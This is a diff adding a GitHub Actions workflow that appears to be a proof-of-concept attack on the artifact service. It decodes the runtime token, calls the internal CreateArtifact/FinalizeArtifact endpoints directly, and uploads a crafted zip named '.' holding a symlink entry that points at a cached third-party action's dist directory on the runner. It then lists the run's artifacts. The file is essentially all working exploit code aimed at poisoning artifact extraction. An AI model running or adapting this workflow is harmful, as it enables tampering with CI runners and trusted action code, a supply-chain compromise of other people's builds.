@@ -1,0 +1,76 @@
+---
+name: zz-craftzip
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    steps:
+      - name: craft artifact with symlink entry via results service
+        env:
+          SYMTARGET: /home/runner/work/_actions/LouisBrunner/checks-action/dfcbcf801bff1ea7f1414824fc28f2cd697b35da/dist
+        run: |
+          python3 - <<'PY'
+          import os, json, base64, hashlib, urllib.request, zipfile, io
+          tok = os.environ['ACTIONS_RUNTIME_TOKEN']
+          base = os.environ['ACTIONS_RESULTS_URL'].rstrip('/')
+          payload = tok.split('.')[1]; payload += '=' * (-len(payload) % 4)
+          claims = json.loads(base64.urlsafe_b64decode(payload))
+          print("CLAIMS_KEYS", sorted(claims.keys()))
+          run_id = job_id = None
+          for s in claims.get('scp', '').split(' '):
+              if s.startswith('Actions.Results:'):
+                  _, run_id, job_id = s.split(':')
+          print("IDS", run_id, job_id)
+          def twirp(method, body):
+              req = urllib.request.Request(
+                  f"{base}/twirp/github.actions.results.api.v1.ArtifactService/{method}",
+                  data=json.dumps(body).encode(),
+                  headers={'Content-Type': 'application/json',
+                           'Authorization': 'Bearer ' + tok})
+              return json.loads(urllib.request.urlopen(req, timeout=30).read())
+          name = '.'
+          try:
+              r = twirp('CreateArtifact', {'workflowRunBackendId': run_id,
+                                           'workflowJobRunBackendId': job_id,
+                                           'name': name, 'version': 7,
+                                           'mimeType': {'value': 'application/zip'}})
+          except urllib.error.HTTPError as e:
+              print("CREATE_FAILED", e.code, e.read()[:400]); raise SystemExit(0)
+          print("CREATE_RESP", {k: (v[:80] if isinstance(v, str) else v) for k, v in r.items()})
+          url = r.get('signedUploadUrl') or r.get('signed_upload_url')
+          buf = io.BytesIO()
+          z = zipfile.ZipFile(buf, 'w')
+          zi = zipfile.ZipInfo('x'); zi.external_attr = (0o120777) << 16
+          z.writestr(zi, os.environ['SYMTARGET'])
+          z.close()
+          data = buf.getvalue()
+          try:
+              req = urllib.request.Request(url, data=data, method='PUT',
+                  headers={'x-ms-blob-type': 'BlockBlob',
+                           'Content-Type': 'application/zip',
+                           'Content-Length': str(len(data))})
+              resp = urllib.request.urlopen(req, timeout=60)
+              print("UPLOAD_STATUS", resp.status)
+          except urllib.error.HTTPError as e:
+              print("UPLOAD_FAILED", e.code, e.read()[:400])
+          h = 'sha256:' + hashlib.sha256(data).hexdigest()
+          try:
+              r2 = twirp('FinalizeArtifact', {'workflowRunBackendId': run_id,
+                                              'workflowJobRunBackendId': job_id,
+                                              'name': name, 'size': str(len(data)),
+                                              'hash': {'value': h}})
+              print("FINALIZE_RESP", r2)
+          except urllib.error.HTTPError as e:
+              print("FINALIZE_FAILED", e.code, e.read()[:400])
+          PY
+      - name: list
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          gh api "repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/artifacts" | jq -r '.artifacts[] | "ID=\(.id) NAME=[\(.name)] SIZE=\(.size_in_bytes)"'
